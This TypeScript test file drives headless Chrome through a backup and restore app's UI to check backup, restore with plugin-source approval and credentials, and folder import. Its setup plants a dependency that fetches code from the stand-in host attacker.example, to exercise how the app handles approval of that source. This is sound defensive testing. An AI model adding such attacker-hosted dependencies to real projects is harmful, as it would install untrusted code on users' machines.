/**
 * Real-browser user flows (usability round, review of 3cf5092). Headless Chrome loads the real
 * VaultApp bundle against the real HTTP routes; a driver script in the page clicks through the
 * UI like a user and records the JSON bodies the client sends. This is the path the earlier
 * tests missed (VaultApp re-built the restore body and dropped fields).
 *
 * Linux + Chrome/Chromium only (GitHub's ubuntu runners have Chrome); skipped elsewhere.
 * DSH_VAULT_CHROME overrides the browser binary.
 */
import { describe, it, before, after } from 'node:test'
import assert from 'node:assert/strict'
import { execFile } from 'node:child_process'
import { existsSync } from 'node:fs'
import { mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises'
import { createServer, type Server } from 'node:http'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { build } from 'esbuild'
import { VaultService } from '../src/core/vault-service.js'
import { buildVaultRoutes } from '../src/api/routes.js'
import { unpackTarGz } from '../src/core/archive.js'
import { translate } from '../src/client/i18n.js'
import { allowAll } from './api-client.js'
import { makeTempHome } from './helpers.js'

function findChrome(): string | null {
  const env = process.env.DSH_VAULT_CHROME?.trim()
  if (env) return existsSync(env) ? env : null
  if (process.platform !== 'linux') return null
  for (const c of ['/usr/bin/google-chrome', '/usr/bin/google-chrome-stable', '/usr/bin/chromium', '/usr/bin/chromium-browser']) if (existsSync(c)) return c
  return null
}
const chrome = findChrome()

const L = {
  preview: translate('zh', 'restore.preview'),
  submit: translate('zh', 'restore.submit'),
  confirm: translate('zh', 'restore.dialogConfirm'),
  backup: translate('zh', 'backup.submit'),
  backupOk: translate('zh', 'summary.backup.ok'),
  restoreTitles: [translate('zh', 'summary.restore.ok'), translate('zh', 'summary.restore.partial'), translate('zh', 'summary.restore.failed')],
  diffTitle: translate('zh', 'restore.diffTitle'),
}

/** Driver helpers + one flow; result JSON goes into <pre id="out">. */
const DRIVER = (flow: string, params: Record<string, string>) => `
const P = ${JSON.stringify(params)}, L = ${JSON.stringify(L)};
const sent = [];
const realFetch = window.fetch.bind(window);
window.fetch = (url, init) => { if (init && init.body) { try { sent.push({ url: String(url), body: JSON.parse(init.body) }) } catch {} } return realFetch(url, init) };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
async function waitFor(fn, what, ms = 20000) { const end = Date.now() + ms; for (;;) { const v = fn(); if (v) return v; if (Date.now() > end) throw new Error('timeout: ' + what); await sleep(50) } }
const byText = (sel, text) => [...document.querySelectorAll(sel)].find((e) => (e.textContent || '').trim().includes(text));
const exact = (text) => [...document.querySelectorAll('button')].find((e) => (e.textContent || '').trim() === text);
function setValue(el, v) { const proto = el.tagName === 'SELECT' ? HTMLSelectElement.prototype : HTMLInputElement.prototype; Object.getOwnPropertyDescriptor(proto, 'value').set.call(el, v); el.dispatchEvent(new Event(el.tagName === 'SELECT' ? 'change' : 'input', { bubbles: true })) }
const banners = () => [...document.querySelectorAll('.dv-banner')].map((b) => b.textContent);
async function importPreview(path, password) {
  const sel = await waitFor(() => [...document.querySelectorAll('select')].find((s) => [...s.options].some((o) => o.value === 'import')), 'source select');
  setValue(sel, 'import');
  setValue(await waitFor(() => document.getElementById('dv-restore-import'), 'import input'), path);
  if (password) setValue(await waitFor(() => document.getElementById('dv-restore-password'), 'password'), password);
  await sleep(50);
  (await waitFor(() => { const b = exact(L.preview); return b && !b.disabled && b }, 'preview button')).click();
}
const flows = {
  async restore() {
    await importPreview(P.path, P.password);
    await waitFor(() => byText('*', L.diffTitle), 'preview');
    const box = await waitFor(() => document.querySelector('.dv-plugin-sources input[type=checkbox]'), 'source checkbox');
    if (!box.checked) box.click();
    const secrets = await waitFor(() => document.getElementById('dv-restore-secrets'), 'secrets switch');
    if (!secrets.checked) secrets.click();
    document.getElementById('dv-restore-ack').click();
    await sleep(50);
    (await waitFor(() => { const b = [...document.querySelectorAll('.dv-card-foot button')].find((e) => (e.textContent || '').trim() === L.submit); return b && !b.disabled && b }, 'submit')).click();
    await sleep(100);
    const confirm = [...document.querySelectorAll('button')].find((b) => (b.textContent || '').trim() === L.confirm);
    if (confirm) confirm.click();
    await waitFor(() => banners().some((t) => L.restoreTitles.some((x) => t.startsWith(x))), 'restore result', 30000);
  },
  async backup() {
    // Targets load asynchronously; the panel preselects one once they arrive.
    await waitFor(() => document.querySelector('[role=radiogroup] input:checked, [role=radiogroup] [aria-checked=true]'), 'target preselected');
    (await waitFor(() => { const b = exact(L.backup); return b && !b.disabled && b }, 'backup button')).click();
    await waitFor(() => banners().some((t) => t.startsWith(L.backupOk)), 'backup result', 30000);
  },
  async folder() {
    await importPreview(P.path);
    await waitFor(() => byText('*', L.diffTitle) || document.querySelector('.dv-banner[data-tone=error]'), 'preview or error');
  },
};
(async () => {
  let error = null;
  try { await flows[${JSON.stringify(flow)}]() } catch (e) { error = String(e) + ' buttons=' + [...document.querySelectorAll('button')].map((b) => (b.disabled ? '!' : '') + b.textContent.trim()).join('|') }
  document.getElementById('out').textContent = 'RESULT' + JSON.stringify({ error, sent, banners: banners(), diff: Boolean(byText('*', L.diffTitle)) }) + 'END';
})();
`

describe('real browser UI flows (restore approvals + credentials, backup summary, folder import)', { skip: chrome ? false : 'no Chrome/Chromium on this machine (runs on Linux CI)' }, () => {
  let home: Awaited<ReturnType<typeof makeTempHome>>
  let service: VaultService
  let server: Server
  let origin = ''
  let profile = ''
  let bundle = ''
  const calls: string[][] = []
  const approved = () => join(home.root, 'approved')

  before(async () => {
    home = await makeTempHome()
    const pkgPath = join(home.dshHome, 'profiles', 'web', 'package.json')
    const pkg = JSON.parse(await readFile(pkgPath, 'utf8'))
    pkg.dependencies.evil = 'git+https://attacker.example/evil.git'
    await writeFile(pkgPath, JSON.stringify(pkg))
    await mkdir(approved(), { recursive: true })
    await mkdir(join(home.root, 'user-home'), { recursive: true })
    service = new VaultService({
      dshHome: home.dshHome, agentsHome: home.agentsHome,
      apiHome: join(home.root, 'user-home'), apiPathRoots: [approved()],
      registryLookup: null, registryIntegrity: null,
      runPluginInstall: async (_c, args) => { calls.push(args); return { ok: false, detail: 'offline', code: 1 } },
    })
    await service.init()
    const out = await build({ entryPoints: [join(process.cwd(), 'tests/ui-harness/entry.tsx')], bundle: true, write: false, format: 'iife', platform: 'browser', jsx: 'automatic', loader: { '.css': 'empty' }, define: { 'process.env.NODE_ENV': '"production"' }, logLevel: 'silent' })
    bundle = out.outputFiles[0]!.text
    const routes = buildVaultRoutes(service, allowAll)
    let driver = ''
    server = createServer((req, res) => {
      const url = new URL(req.url ?? '/', 'http://localhost')
      if (url.pathname === '/app.js') { res.writeHead(200, { 'content-type': 'text/javascript' }); res.end(bundle); return }
      if (url.pathname === '/driver.js') { res.writeHead(200, { 'content-type': 'text/javascript' }); res.end(driver); return }
      if (url.pathname === '/') {
        const flow = url.searchParams.get('flow') ?? ''
        driver = DRIVER(flow, Object.fromEntries(url.searchParams))
        res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' })
        // driver.js first so it wraps window.fetch before the app makes requests.
        res.end(`<!doctype html><html><body><pre id="out">running</pre><div id="root"></div><script src="/driver.js"></script><script src="/app.js"></script></body></html>`)
        return
      }
      const route = routes.find((r) => r.path === url.pathname)
      if (!route) { res.writeHead(404); res.end(); return }
      void route.handler(req, res)
    })
    await new Promise<void>((r) => server.listen(0, '127.0.0.1', r))
    origin = `http://localhost:${(server.address() as { port: number }).port}`
    profile = await mkdtemp(join(tmpdir(), 'dv-chrome-ui-'))
  })
  after(async () => {
    service.stopSchedule()
    await new Promise<void>((r) => server.close(() => r()))
    await rm(profile, { recursive: true, force: true }).catch(() => {})
    await home.cleanup()
  })

  async function run(query: Record<string, string>): Promise<{ error: string | null; sent: Array<{ url: string; body: Record<string, unknown> }>; banners: string[]; diff: boolean }> {
    const url = `${origin}/?${new URLSearchParams(query)}`
    const dom = await new Promise<string>((resolve, reject) => {
      execFile(chrome!, ['--headless=new', '--no-sandbox', '--disable-gpu', '--no-first-run', `--user-data-dir=${profile}`, '--virtual-time-budget=60000', '--dump-dom', url], { timeout: 120_000, maxBuffer: 16 * 1024 * 1024 }, (err, stdout) => (err && !stdout ? reject(err) : resolve(stdout)))
    })
    const m = /RESULT(.*)END/s.exec(dom)
    assert.ok(m, `driver did not finish:\n${dom.slice(0, 2000)}`)
    const text = m[1]!.replace(/&quot;/g, '"').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&')
    return JSON.parse(text)
  }

  it('backup: the success banner shows the real file count', async () => {
    const r = await run({ flow: 'backup', tab: 'backup' })
    assert.equal(r.error, null, JSON.stringify(r))
    // Plaintext backup: the credentials category is not sent (U-7).
    const body = r.sent.find((x) => x.url.endsWith('/jobs/backup'))?.body as { encrypt?: boolean; categories?: string[] } | undefined
    assert.ok(body && body.encrypt === false && Array.isArray(body.categories) && !body.categories.includes('credentials'), JSON.stringify(body))
    const banner = r.banners.find((b) => b.startsWith(L.backupOk))!
    const files = Number(/(\d+) 个文件/.exec(banner)?.[1])
    const latest = (await service.listSnapshots(service.listTargets()[0]!.id))[0]!
    assert.ok(files > 5, banner)
    const bytes = await readFile(join((service.listTargets()[0] as { directory: string }).directory, latest.remoteKey))
    const manifest = JSON.parse(unpackTarGz(bytes).find((e) => e.path === 'manifest.json')!.data.toString('utf8'))
    assert.equal(files, manifest.files.length, banner)
  })

  it('restore: a checked plugin source and "restore credentials" are sent and take effect', async () => {
    const snap = join(approved(), 'secret.dshvault')
    await service.backup({ exportFile: snap, encrypt: true, password: 'pw-123456', includeSecrets: true })
    await writeFile(join(home.dshHome, '.credentials.yaml'), 'apiKey: LOCAL\n')
    calls.length = 0
    const r = await run({ flow: 'restore', tab: 'restore', path: snap, password: 'pw-123456' })
    assert.equal(r.error, null, JSON.stringify(r))
    const body = r.sent.find((s) => s.url.endsWith('/jobs/restore'))?.body
    assert.ok(body, JSON.stringify(r.sent))
    assert.equal(body.includeSecrets, true, JSON.stringify(body))
    assert.ok(Array.isArray(body.approvedPluginSources) && (body.approvedPluginSources as string[]).length === 1 && /^web:evil#[0-9a-f]{16}$/.test((body.approvedPluginSources as string[])[0]!), JSON.stringify(body))
    assert.equal(await readFile(join(home.dshHome, '.credentials.yaml'), 'utf8'), 'apiKey: SUPER-SECRET-KEY\n')
    assert.ok(calls.some((a) => a.join(' ').includes('attacker.example/evil.git')), 'the approved source was attempted')
  })

  it('folder import: an extracted snapshot folder previews without an error', async () => {
    const tgz = join(approved(), 'plain.tar.gz')
    await service.backup({ exportFile: tgz })
    const folder = join(approved(), 'import-folder')
    for (const e of unpackTarGz(await readFile(tgz))) {
      await mkdir(join(folder, e.path, '..'), { recursive: true })
      await writeFile(join(folder, e.path), e.data)
    }
    const r = await run({ flow: 'folder', tab: 'restore', path: folder })
    assert.equal(r.error, null, JSON.stringify(r))
    assert.equal(r.diff, true, JSON.stringify(r.banners))
    assert.ok(!r.banners.some((b) => /incorrect header check|HTTP 500/.test(b)), JSON.stringify(r.banners))
  })
})
